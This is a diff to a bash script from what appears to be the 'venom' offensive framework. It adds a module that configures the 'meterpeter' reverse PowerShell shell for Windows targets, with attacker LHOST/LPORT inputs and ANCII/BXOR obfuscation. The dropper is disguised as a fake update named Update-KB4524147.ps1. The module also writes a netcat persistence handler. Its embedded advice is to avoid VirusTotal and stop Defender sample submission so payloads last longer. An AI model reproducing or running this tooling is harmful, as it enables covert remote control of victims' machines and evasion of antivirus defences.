@@ -18,7 +18,6 @@ resize -s 40 105 > /dev/null
 
 
 
-
 # --------------------
 # check if user is root
 # ---------------------
@@ -11970,6 +11969,16 @@ cat << !
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : AVAILABLE
 
+    AGENT Nº4
+    ╔──────────────────────────────────────────────────────────────
+    | DESCRIPTION        : meterpeter Reverse PS Shell (ancii|bxor)
+    | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
+    | LOLBin             : Powershell (DownloadFile)
+    | DROPPER EXTENSION  : BAT
+    | AGENT EXTENSION    : PS1
+    |_AGENT PERSISTENCE  : AVAILABLE (meterpeter)
+
+
     ╔─────────────────────────────────────────────────────────────╗
     ║   M    - Return to main menu                                ║
     ║   E    - Exit venom Framework                               ║
@@ -11986,6 +11995,7 @@ case $choice in
 1) sh_evasion1 ;;
 2) sh_evasion2 ;;
 3) sh_evasion3 ;;
+4) sh_evasion4 ;;
 m|M) sh_menu ;;
 e|E) sh_exit ;;
 h|H) sh_per_handler ;;
@@ -12021,11 +12031,11 @@ clear;sh_ninja
 fi
 
 
-## This function Lists until [7] occurrencies {Files} ..
+## This function Lists until [9] occurrencies {Files} ..
 echo "";echo "${BlueF}Listing Persistence Handler(s) Stored${white}"
 echo "-------------------------------------";sleep 1
 for i in $per_list; do
-   count=$(($count+1)) # count nº of occurencies {max:7}
+   count=$(($count+1)) # count nº of occurencies {max:9}
    echo "[$count] $i"  # display each occurrencie with id number attach
    if [ "$count" = "1" ]; then
       um="$i"
@@ -12041,6 +12051,10 @@ for i in $per_list; do
       seis="$i"
    elif [ "$count" = "7" ]; then
       sete="$i"
+   elif [ "$count" = "8" ]; then
+      oito="$i"
+   elif [ "$count" = "9" ]; then
+      nove="$i"
    fi
 done
 
@@ -12067,6 +12081,10 @@ elif [ "$sellection" = "6" ]; then
    handler="$seis"
 elif [ "$sellection" = "7" ]; then
    handler="$sete"
+elif [ "$sellection" = "8" ]; then
+   handler="$oito"
+elif [ "$sellection" = "9" ]; then
+   handler="$nove"
 fi
 
 
@@ -12103,7 +12121,6 @@ ACTIVE_ON : $set_dates
 
 !
 ## Execute Sellected Handler Settings to Run.
-echo "${BlueF}[${YellowF}i${BlueF}]${white} Handler Sellection .. ";sleep 1
 sellection=$(zenity --list --title "☠ HANDLER SELLECTION ☠" --text "\nChose From Available Options:" --radiolist --column "Pick" --column "Option" TRUE "Run Sellected Handler (default)" FALSE "Chose A New Handler File" FALSE "Just Start Netcat -lvp [port]" FALSE "Return to Amsi Evasion Menu" --width 350 --height 260) > /dev/null 2>&1
 if [ "$sellection" = "Run Sellected Handler (default)" ]; then
    xterm -T " PERSISTENCE HANDLER - $set_lhost:$set_lport" -geometry 110x23 -e "echo StartUp: [$set_name][Silent:$set_state];$set_handler"
@@ -12119,7 +12136,7 @@ fi
 
 ## Exit Module
 cd $IPATH
-clear
+sleep 2;clear
 sh_ninja
 }
 
@@ -12784,8 +12801,132 @@ sh_menu
 
 
 
-# NOT IN USE
+
+# ------------------------------------------
+# meterpeter PS Reverse TCP Shell/Client
+# https://github.com/r00t-3xp10it/meterpeter
+# ------------------------------------------
 sh_evasion4 () {
+Colors;
+
+## Check for Attacker arch dependencie
+# M$ only supports PS under x64 bit systems
+if [ "$ArCh" = "x86" ]; then
+  echo "${RedF}[x]${white} Check: This Module does not run under ${RedF}[x32 bit]"${Reset};sleep 1
+  echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
+  read op;clear;sh_ninja
+fi
+
+
+## Check if PS its installed
+# Powershell under x64 Linux Distros (pwsh)
+ps_test=$(which pwsh)
+if ! [ "$?" -eq "0" ]; then
+   echo "${RedF}[x]${white} Check: Powershell not found (pwsh) .."${Reset};
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Please Wait, installing dependencies .."${Reset};
+   echo ""
+   sudo apt-get update && apt-get -y install powershell
+   echo ""
+     ## try again now
+     second_test=$(which pwsh)
+     if ! [ "$?" -eq "0" ]; then
+        echo "${RedF}[x]${white} Check: Venom Cant install powershell (pwsh)"${Reset};
+        echo "${RedF}[x] Powershell Default Dir: /usr/bin/pwsh"${Reset};
+        echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
+        read op;clear;sh_ninja
+     else
+        echo "${BlueF}[${YellowF}i${BlueF}]${white} Check: Venom Reports that pwsh was successfull installed."${Reset};
+        sleep 3
+     fi
+fi
+
+
+## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
+echo "---"
+echo "- ${YellowF}WARNING ABOUT SCANNING SAMPLES (VirusTotal)"${Reset};
+echo "- Please Dont test samples on Virus Total or on similar";
+echo "- online scanners, because that will shorten the payload life.";
+echo "- And in testings also remmenber to stop the windows defender";
+echo "- from sending samples to \$Microsoft..";
+echo "---"
+sleep 2
+
+
+## Store User Inputs (bash variable declarations)..
+lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
+lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
+Obtype=$(zenity --list --title "☠ OBFUSCATION MODULE ☠" --text "\nAvailable Obfuscation Methods:" --radiolist --column "Pick" --column "Option" TRUE "ANCII" FALSE "BXOR" --width 350 --height 200) > /dev/null 2>&1
+## Setting default values in case user have skip this ..
+if [ -z "$lhost" ]; then lhost="$IP";fi
+if [ -z "$lport" ]; then lport="443";fi
+if [ -z "$Obtype" ]; then Obtype="ANCII";fi
+
+
+## meterpeter project
+# Config meterpeter Settings File & exec PS1 (Server)
+if ! [ -d "$IPATH/bin/meterpeter" ]; then
+  echo "${RedF}[x]${white} Abort, meterpeter Project not Found .."${Reset};
+  echo "${RedF}[x] Local Path: $IPATH/bin/meterpeter"${Reset};sleep 1
+  echo "${BlueF}[${YellowF}i${BlueF}]${white} https://github.com/r00t-3xp10it/meterpeter";
+  echo "${BlueF}[☠]${white} Press [Enter] to return to amsi menu ..";
+  read op;clear;sh_ninja
+else
+  cd $IPATH/bin/meterpeter
+  ## Config 'meterpeter' Settings File
+  echo "${BlueF}[${YellowF}i${BlueF}] meterpeter Working Dir:${GreenF} '$IPATH/bin/meterpeter'"${Reset};sleep 2
+  if [ "$Obtype" = "ANCII" ]; then Obtype="1";else Obtype="2";fi
+  set_ip=$(cat Settings.txt|grep -m 1 'IP'|cut -d ':' -f2)
+  set_port=$(cat Settings.txt|grep -m 1 'PORT'|cut -d ':' -f2)
+  set_obfs=$(cat Settings.txt|grep -m 1 'OBFUS'|cut -d ':' -f2)
+  ## Renew Settings File using bash 'sed'
+  sed -i "s|$set_ip|$lhost|" Settings.txt
+  sed -i "s|$set_port|$lport|" Settings.txt
+  sed -i "s|$set_obfs|$Obtype|" Settings.txt
+  ## Run meterpeter binary (ps1)
+  dtr=$(date|awk {'print $1,$2,$3,$4'})
+  pwsh -File meterpeter.ps1
+  cd $IPATH
+fi
+
+
+## Build Handler file (output folder)
+## Generate Random {6 chars} Handler Name.
+if [ -e "$IPATH/bin/meterpeter/Update-KB4524147.ps1" ]; then
+   random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
+   ## Write handler file to venom output folder
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Handler:${GreenF} $IPATH/output/meterpeter_$random_name.handler"${Reset};sleep 2
+   echo "+----------------------------------+" > $IPATH/output/meterpeter_$random_name.handler
+   echo "| meterpeter - Persistence Handler |" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "+----------------------------------+" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "SILENT:OFF" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "LPORT:$lport" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "LHOST:$lhost" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "HANDLER:sudo nc -lvp $lport" >> $IPATH/output/meterpeter_$random_name.handler
+   echo "ACTIVE_ON=$dtr" >> $IPATH/output/meterpeter_$random_name.handler
+fi
+
+
+cd $IPATH
+## Clean old files/configs ..
+echo "${BlueF}[☠]${white} Please Wait, Cleaning old conf files .."${Reset};sleep 2
+rm $IPATH/bin/meterpeter/Update-KB4524147.ps1 > /dev/nul 2>&1
+rm $IPATH/bin/meterpeter/test.txt > /dev/nul 2>&1
+rm $ApAcHe/Update-KB4524147.ps1 > /dev/nul 2>&1
+rm $ApAcHe/Update-KB4524147.zip > /dev/nul 2>&1
+
+## Jump to Main menu
+sleep 3
+sh_ninja
+}
+
+
+
+
+
+
+
+# NOT IN USE
+sh_evasion444 () {
 Colors;
 
 ## WARNING ABOUT SCANNING SAMPLES (VirusTotal)
